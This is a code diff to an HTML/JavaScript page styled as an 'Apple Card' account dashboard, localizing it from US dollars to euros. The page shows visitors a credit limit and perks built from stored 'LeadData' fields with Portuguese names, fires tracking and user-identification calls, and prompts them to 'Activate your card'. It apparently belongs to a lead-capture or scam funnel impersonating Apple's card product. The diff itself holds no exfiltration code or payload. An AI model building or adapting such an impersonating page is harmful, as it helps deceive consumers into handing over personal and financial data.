@@ -174,7 +174,7 @@
         <!-- Balance -->
         <div class="balance-section">
             <div class="balance-label">Available credit</div>
-            <div class="balance-value"><small>$</small><span id="balanceValue">5,000</span><small>.00</small></div>
+            <div class="balance-value"><small>€</small><span id="balanceValue">5.000</span><small>,00</small></div>
         </div>
 
         <!-- Quick Actions -->
@@ -245,7 +245,7 @@
                 <div class="tx-item">
                     <div class="tx-icon" style="background:rgba(52,199,89,0.12)"><svg viewBox="0 0 24 24" fill="#34C759"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg></div>
                     <div class="tx-info"><div class="tx-name">Cashback Available</div><div class="tx-date">Accumulated</div></div>
-                    <div><div class="tx-amount" style="color:var(--success)">$0.00</div><div class="tx-cashback">Activate your card</div></div>
+                    <div><div class="tx-amount" style="color:var(--success)">€ 0,00</div><div class="tx-cashback">Activate your card</div></div>
                 </div>
                 <div style="text-align:center;padding:24px 0;color:var(--gray-400);font-size:0.8125rem">
                     <svg width="40" height="40" viewBox="0 0 24 24" fill="var(--gray-300)" style="display:block;margin:0 auto 8px"><path d="M13 3c-4.97 0-9 4.03-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42C8.27 19.99 10.51 21 13 21c4.97 0 9-4.03 9-9s-4.03-9-9-9zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z"/></svg>
@@ -263,7 +263,7 @@
                 </div>
                 <div class="info-card">
                     <div class="ic-header"><div class="ic-title">Exclusive Perks</div></div>
-                    <div class="ic-row"><span class="label">Annual fee</span><span class="value" style="color:var(--success)">$0</span></div>
+                    <div class="ic-row"><span class="label">Annual fee</span><span class="value" style="color:var(--success)">€ 0</span></div>
                     <div class="ic-row"><span class="label">Fees</span><span class="value">No foreign transaction fees</span></div>
                     <div class="ic-row"><span class="label">Installments</span><span class="value">Up to 12 months with 0% APR</span></div>
                     <div class="ic-row"><span class="label">Support</span><span class="value">24/7 via iMessage</span></div>
@@ -299,7 +299,7 @@
         function buildUrl(b,e={}){const u=new URL(b,window.location.href);new URLSearchParams(window.location.search).forEach((v,k)=>u.searchParams.set(k,v));Object.entries(e).forEach(([k,v])=>{if(v)u.searchParams.set(k,v)});return u.toString()}
 
         LeadData.update({ page: 'dashboard' });
-        if (window.track) window.track('DashboardView', { content_id: 'apple-card-us', currency: 'USD' });
+        if (window.track) window.track('DashboardView', { content_id: 'apple-card-eu', currency: 'EUR' });
         if (window.identifyUser) window.identifyUser();
         const data = LeadData.load();
         const userName = data.nome || 'Guest';
@@ -319,10 +319,10 @@
         document.getElementById('mcName').textContent = userName.toUpperCase();
         document.getElementById('mcType').textContent = `Apple Card • ${corLabel}`;
         document.getElementById('mcBg').style.background = colorMap[corCartao] || colorMap.silver;
-        document.getElementById('balanceValue').textContent = limite.toLocaleString('en-US');
+        document.getElementById('balanceValue').textContent = limite.toLocaleString('de-DE');
 
         document.getElementById('icNome').textContent = userName;
-        document.getElementById('icLimite').textContent = `$${limite.toLocaleString('en-US')}.00`;
+        document.getElementById('icLimite').textContent = `€ ${limite.toLocaleString('de-DE')},00`;
         document.getElementById('icVenc').textContent = data.vencimento ? `Day ${data.vencimento}` : '—';
         document.getElementById('icCor').textContent = `Apple Card ${corLabel}`;
 
